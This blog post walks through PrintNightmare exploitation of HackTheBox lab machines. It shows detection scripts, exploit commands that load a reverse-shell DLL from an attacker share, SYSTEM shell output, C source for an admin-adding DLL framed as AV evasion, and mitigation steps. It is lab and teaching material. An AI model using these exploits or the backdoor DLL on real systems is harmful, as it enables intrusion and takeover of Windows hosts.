<p>Now to check if the Print Spooler service enabled, I could follow cube0x0&rsquo;s instruction by using a tool from impacket called <code>rpcdump.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ rpcdump.py @<span class="o">[</span>IP-ADDRESS<span class="o">]</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
</code></pre></div><p>I found out that <code>rpcclient</code> can also be used to detect the Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is <strong>&ldquo;Could not initialise spoolss&rdquo;</strong>, then the Print Spooler is most likely to be disabled.</p>
<p>The following is a dirty bash script I created to do both using <code>rpcdump.py</code> and <code>rpcclient</code> in one run.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
</span><span class="cp"></span>
<span class="nv">targets</span><span class="o">=</span><span class="nv">$1</span>

<span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$targets</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nb">echo</span> <span class="s2">&#34;[-] Usage\t: </span><span class="nv">$0</span><span class="s2"> [Target file]&#34;</span> 
  <span class="nb">echo</span> <span class="s2">&#34;[-] File format : &lt;ip&gt;:&lt;username&gt;:&lt;password&gt; | 127.0.0.1:foo:bar&#34;</span>
  <span class="k">else</span>
	<span class="k">for</span> target in <span class="sb">`</span>cat <span class="nv">$targets</span><span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
		 <span class="nv">ip</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f1<span class="k">)</span>
		 <span class="nv">username</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2<span class="k">)</span>
		 <span class="nv">password</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f3<span class="k">)</span>
		 <span class="nb">echo</span>  <span class="s2">&#34; - [</span><span class="nv">$ip</span><span class="s2">] - &#34;</span> 
		 impacket-rpcdump <span class="nv">$ip</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
		 rpcclient -U <span class="s2">&#34;</span><span class="nv">$username</span><span class="s2">%</span><span class="nv">$password</span><span class="s2">&#34;</span> <span class="nv">$ip</span> -c <span class="s2">&#34;enumprinters;quit&#34;</span>
	<span class="k">done</span>
<span class="k">fi</span>
</code></pre></div><p>I saved the script as <code>detect-nightmare.sh</code> . I ran the script and it returned the following results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ ./detect-nightmare.sh target-machines
 - <span class="o">[</span>10.10.10.100<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
 - <span class="o">[</span>10.10.10.134<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
No printers returned.
 - <span class="o">[</span>10.10.10.149<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
No printers returned.
 - <span class="o">[</span>10.10.10.161<span class="o">]</span> - 
Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
 - <span class="o">[</span>10.10.10.237<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
No printers returned.
</code></pre></div><p>From the results above, Active and Forest don&rsquo;t seem to be vulnerable, but I will still test them out!</p>
<h2 id="exploitation-demo">Exploitation Demo</h2>
<h3 id="101010100-active">[10.10.10.100] Active</h3>
<p>As expected, on Active, the exploit failed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span>@10.10.10.100 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.100<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Connection Failed
</code></pre></div><p><img class="img-container" src="imgs/image-20210718002853259.png" alt="image-20210718002853259"  />
</p>
<h3 id="101010134-bastion">[10.10.10.134] Bastion</h3>
<p>I ran the exploit against Bastion, but the DLL got removed by AV 😂.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py Bastion/l4mpje:<span class="s1">&#39;bureaulampje&#39;</span>@10.10.10.134 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.134<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_1734185bdb8f8610<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
...<span class="o">[</span>SNIP<span class="o">]</span>...
impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not <span class="nb">complete</span> successfully because the file contains a virus or potentially unwanted software
</code></pre></div><p><img class="img-container" src="imgs/image-20210718002921209.png" alt="image-20210718002921209"  />
</p>
<p>No problem! The conclusion here is that Bastion was vulnerable.</p>
<h3 id="101010134-heist">[10.10.10.134] Heist</h3>
<p>On Heist, the exploit didn&rsquo;t show an indication of a successful exploitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py heist/hazard:<span class="s1">&#39;stealth1agent&#39;</span>@10.10.10.149 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.149<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_83aa9aebf5dffc96<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Try 2...
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
...<span class="o">[</span>SNIP<span class="o">]</span>...
impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
</code></pre></div><p>But strangely, I got a shell in my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ nc -nvlp <span class="m">4444</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.149<span class="o">]</span> <span class="m">49700</span>
Microsoft Windows <span class="o">[</span>Version 10.0.17763.437<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
whoami
nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;hostname
hostname
SupportDesk

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::c138:bcba:454d:8b9c
   Link-local IPv6 Address . . . . . : fe80::c138:bcba:454d:8b9c%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.149
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
                                       10.10.10.2
</code></pre></div><p><img class="img-container" src="imgs/image-20210717130728398.png" alt="image-20210717130728398"  />
</p>
<h3 id="101010161-forest">[10.10.10.161] Forest</h3>
<p>Like on Active, the exploit also failed on Forest</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py htb.local/svc-alfresco:<span class="s1">&#39;s3rvice&#39;</span>@10.10.10.161 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.161<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Connection Failed
</code></pre></div><p><img class="img-container" src="imgs/image-20210718002812865.png" alt="image-20210718002812865"  />
</p>
<h3 id="101010237-atom">[10.10.10.237] Atom</h3>
<p>On Atom, the exploit returned the same result as on Heist, no indication of a successful exploitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Try 2...
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
...<span class="o">[</span>SNIP<span class="o">]</span>...
impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
</code></pre></div><p>But then the DLL connected to my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ nc -nvlp <span class="m">4444</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">62322</span>
Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
whoami
nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
hostname
ATOM

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::6036:234d:b46e:b7d
   Temporary IPv6 Address. . . . . . : dead:beef::6193:2da2:279d:6fea
   Temporary IPv6 Address. . . . . . : dead:beef::94cf:8412:6dc6:a8ed
   Link-local IPv6 Address . . . . . : fe80::6036:234d:b46e:b7d%6
   IPv4 Address. . . . . . . . . . . : 10.10.10.237
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
                                       10.10.10.2
</code></pre></div><p><img class="img-container" src="imgs/image-20210717125927762.png" alt="image-20210717125927762"  />
</p>
<h2 id="troubleshoot">Troubleshoot</h2>
<h3 id="status_pipe_closing">STATUS_PIPE_CLOSING</h3>
<p>I&rsquo;m sure that the following error is caused by my DLL payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)
</code></pre></div><p>This is probably because, instead of using the DLL to create a user (one time load / execution), I use the DLL for reverse shell.</p>
<p><del>I wanted to generate my own payload to test but my Visual Studio somehow didn&rsquo;t want me to install the Windows SDK</del>  (Fixed on <a href="https://fahmifj.github.io/blog/windows-10-troubleshoot-permissions/">this post</a>).</p>
<p>So I stole <a href="https://github.com/fahmifj/PrintNightmare-kit/blob/main/generate-nightmaredll.ps1">this payload</a> from this <a href="https://github.com/calebstewart/CVE-2021-1675">PoC</a> created by Caleb Stewart and John Hammond.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS /opt/PrintNightmare/dll&gt; Import-Module ./generate-nightmaredll.ps1
PS /opt/PrintNightmare/dll&gt; Get-NightmareDLL
<span class="o">[</span>+<span class="o">]</span> Created payload at /opt/printnightmare/dll/nightmare.dll
</code></pre></div><p>I ran the exploit again on Atom, but this time it didn&rsquo;t crash, instead it displayed the proper message of a successful exploitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> ✗ 
$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\nightmare.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\n</span>ightmare.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Try 2...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Stage2: <span class="m">0</span>
<span class="o">[</span>+<span class="o">]</span> Exploit Completed
</code></pre></div><p>Now I can login with credentials of  <code>adm1n:P@ssw0rd</code> (default credentials from the stolen DLL) using <code>evil-winrm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «dll» «10.10.14.75» 
$ evil-winrm -i 10.10.10.237 -u <span class="s1">&#39;adm1n&#39;</span> -p <span class="s1">&#39;P@ssw0rd&#39;</span>                                                       

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; whoami /groups <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;Administrators&#34;</span>

NT AUTHORITY<span class="se">\L</span>ocal account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner


*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
ATOM
</code></pre></div><h3 id="av-evasion">AV Evasion</h3>
<p>Another issue I ran into during the demo was that the payload got removed by Microsoft Defender on Bastion. Using a self compile DLL payload (I should do this earlier 😅🔨) from <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">BookHackTrick</a> DLL templates can resolve this.</p>
<p>The following is the one that I use.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own
</span><span class="c1">// compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</span><span class="c1"></span><span class="cp">#include</span><span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">Entry</span> <span class="p">(){</span> <span class="c1">//Default function that is executed when the DLL is loaded
</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd.exe /c net user iamf &lt;password&gt; /add&#34;</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd.exe /c net localgroup administrators iamf /add&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">){</span>
        <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
            <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">Entry</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
        <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
        <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The code can be compiled from Linux using <code>mingw-w64</code> compiler ( <code>sudo apt install mingw-w64</code>). I will run the following command to compile the DLL.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</code></pre></div><p><del>I don&rsquo;t demo this DLL since the process and the result are the same 😅</del>.</p>
<p>On Bastion, although the add user payload can evade the AV, I&rsquo;m unable to login using the created user via WinRM. However,  <code>impacket-psexec</code> will do.</p>
<p><img class="img-container" src="imgs/image-20210730191657750.png" alt="image-20210730191657750"  />
</p>
<p>Further investigation, I found out that  <code>Invoke-Command</code> from localhost is allowed.</p>
<p><img class="img-container" src="imgs/image-20210730192152601.png" alt="image-20210730192152601"  />
</p>
<p>So, I guess the WinRM was configured to only allow admin account for remote access. I couldn&rsquo;t get the &ldquo;right&rdquo; keywords to <em>google</em> this. Below are what I&rsquo;ve tried so far:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ winrm get winrm/config
$ winrm get winrm/config/listener
$ <span class="o">(</span>Get-PSSessionConfiguration -Name Microsoft.PowerShell<span class="o">)</span>.Permission
$ HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem
$ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d <span class="m">1</span> /f
</code></pre></div><h2 id="mitigation">Mitigation</h2>
<p>Microsoft provided <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">two options</a> as workarounds to mitigate PrintNightmare:</p>
<ul>
<li>Disable Print Spooler service</li>
<li>Disable inbound remote printing through Group Policy.</li>
</ul>
<p>Also, it is recommended to install <a href="https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7">KB5005010</a> patch.</p>
<p>As for the second option, I have no idea to work with that from CLI, so I will just try the first option.</p>
<h3 id="disable-print-spooler-service">Disable Print Spooler Service</h3>
<p>First, determine if the Print Spooler Service is running by using  <code>Get-Service -Name Spooler</code> in PowerShell. If the service is running, stop and disable it by running the following commands in PowerShell consecutively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ Stop-Service -Name Spooler -Force
$ Set-Service -Name Spooler -StartupType Disabled
</code></pre></div><p>For demo, I will apply these on Bastion.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\&gt;</span> Get-Service -Name Spooler 

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler


*Evil-WinRM* PS C:<span class="se">\&gt;</span> Stop-Service -Name Spooler -Force
*Evil-WinRM* PS C:<span class="se">\&gt;</span> Set-Service -Name Spooler -StartupType Disabled
</code></pre></div><p>After disabling Spooler service, I ran the exploit again, but this time, it returned a &ldquo;Connection Failed&rdquo; message.</p>
<p><img class="img-container" src="imgs/image-20210717133929589.png" alt="image-20210717133929589"  />
</p>
<p>So, the conclusion is it worked! But, the downside is you loss the ability to print from both local and remote 🙃.</p>
<p>For more detailed mitigation, you can go to <a href="https://github.com/LaresLLC/CVE-2021-1675">this GitHub repo</a>.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675</a></li>
<li><a href="https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/">https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/</a></li>
<li><a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></li>
<li><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></li>
<li><a href="https://github.com/LaresLLC/CVE-2021-1675">https://github.com/LaresLLC/CVE-2021-1675</a></li>
<li><a href="https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point">https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point</a></li>
<li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
